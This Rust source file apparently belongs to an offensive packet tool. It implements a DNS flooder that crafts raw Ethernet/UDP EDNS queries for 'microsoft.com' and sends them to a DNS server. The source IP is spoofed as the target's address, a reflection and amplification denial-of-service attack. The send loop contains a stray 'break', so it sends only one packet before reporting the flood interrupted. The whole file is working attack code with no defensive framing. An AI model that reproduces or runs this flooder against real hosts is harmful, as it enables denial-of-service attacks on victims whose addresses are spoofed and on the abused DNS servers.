use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::net::Ipv4Addr;
use crate::engines::DnsArgs;
use crate::iface::IfaceInfo;
use crate::generators::RandomValues;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{ inline_display, parse_mac, mac_u8_to_string, CtrlCHandler };



pub struct DnsFlooder {
    builder:   PacketBuilder,
    iface:     String,
    pkts_sent: usize,
    pkt_data:  PacketData,
    rand:      RandomValues,
}


struct PacketData {
    src_ip:   Ipv4Addr,
    src_mac:  [u8; 6],
    dst_port: u16,
    dst_ip:   Ipv4Addr,
    dst_mac:  [u8; 6],
    payload:  Vec<u8>,
}


impl DnsFlooder {

    pub fn new(args: DnsArgs) -> Self {
        let iface = IfaceInfo::default_iface();

        Self {
            builder:   PacketBuilder::new(),
            pkts_sent: 0,
            pkt_data:  Self::set_pkt_data(args, &iface),
            rand:      RandomValues::new(None, None),
            iface,   
        }
    }



    fn set_pkt_data(args: DnsArgs, iface: &str) -> PacketData {
        let src_mac_str = IfaceInfo::mac(iface);
        let dst_mac_str = IfaceInfo::gateway_mac(iface).unwrap();

        let src_ip  = args.target_ip;
        let src_mac = parse_mac(&src_mac_str).unwrap();
        
        let dst_port = 53;
        let dst_ip   = args.dns_ip;
        let dst_mac  = parse_mac(&dst_mac_str).unwrap();

        let payload = Self::create_a_query();

        PacketData { src_ip, src_mac, dst_port, dst_ip, dst_mac, payload }
    }



    fn create_a_query() -> Vec<u8> {
        Self::create_dns_query("microsoft.com", true)
    }



    fn create_dns_query(domain: &str, use_edns: bool) -> Vec<u8> {
        let header_size   = 12;
        let question_size = Self::compute_question_size(domain);
        let opt_size      = if use_edns { 11 } else { 0 };
        let total_size    = header_size + question_size + opt_size;
        
        let mut payload = vec![0u8; total_size];
        let mut pos     = 0;
        
        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
        pos += 2;
        
        payload[pos] = 0x01; 
        pos += 1;
        payload[pos] = 0x20; 
        pos += 1;
        
        payload[pos] = 0x00;
        pos += 1;
        payload[pos] = 0x01;
        pos += 1;
        
        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
        pos += 2;
        
        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
        pos += 2;
        
        if use_edns {
            payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes());
        } else {
            payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
        }
        pos += 2;
        
        for part in domain.split('.') {
            payload[pos] = part.len() as u8;
            pos += 1;
            payload[pos..pos + part.len()].copy_from_slice(part.as_bytes());
            pos += part.len();
        }
        
        payload[pos] = 0;
        pos += 1;
        
        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes());
        pos += 2;
        
        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes());
        pos += 2;
        
        if use_edns {
            payload[pos] = 0;
            pos += 1;
            
            payload[pos..pos + 2].copy_from_slice(&41u16.to_be_bytes());
            pos += 2;
            
            payload[pos..pos + 2].copy_from_slice(&512u16.to_be_bytes());
            pos += 2;
            
            payload[pos] = 0x00;
            pos += 1;
            
            payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
            pos += 2;
            
            payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes());
        }
        
        payload
    }



    fn compute_question_size(domain: &str) -> usize {
        let mut size = 0;
        for part in domain.split('.') {
            size += 1 + part.len();
        }
        size + 1 + 2 + 2
    }



    fn update_dns_id(&mut self) {
        let new_id = self.rand.random_u16();
        self.pkt_data.payload[0..2].copy_from_slice(&new_id.to_be_bytes());
    }



    pub fn execute(&mut self){
        self.display_pkt_data();
        self.send_endlessly();
    }



    fn display_pkt_data(&self) {
        let src_mac = mac_u8_to_string(self.pkt_data.src_mac);
        let dst_mac = mac_u8_to_string(self.pkt_data.dst_mac);

        println!("TARGET     >> MAC: {}  IP: {}", src_mac, self.pkt_data.src_ip);
        println!("DNS SERVER >> MAC: {}  IP: {}", dst_mac, self.pkt_data.dst_ip);
        println!("IFACE: {}", self.iface);
    }



    fn send_endlessly(&mut self) {
        let socket  = Layer2RawSocket::new(&self.iface);
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            self.update_dns_id();
            
            let pkt = self.get_pkt();
            socket.send(pkt);

            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
            break;
        }

        println!("\nFlood interrupted");
    }


    
    #[inline]
    fn get_pkt(&mut self) -> &[u8] {
        self.builder.udp_ether(
            self.pkt_data.src_mac, 
            self.pkt_data.src_ip, 
            self.rand.random_port(),
            self.pkt_data.dst_mac, 
            self.pkt_data.dst_ip,
            self.pkt_data.dst_port,
            &self.pkt_data.payload
        )
    }

}



impl crate::EngineTrait for DnsFlooder {
    type Args = DnsArgs;
    
    fn new(args: Self::Args) -> Self {
        DnsFlooder::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}